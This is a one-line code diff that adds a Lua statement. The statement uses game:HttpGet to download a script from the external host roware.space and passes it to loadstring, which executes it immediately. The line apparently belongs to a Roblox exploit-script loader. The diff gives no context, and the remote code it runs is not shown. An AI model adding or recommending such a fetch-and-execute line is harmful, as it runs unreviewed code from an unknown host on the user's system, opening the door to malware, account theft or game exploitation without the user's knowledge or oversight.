@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://roware.space/16ac5988214cb04e826b2532.lua", true))()
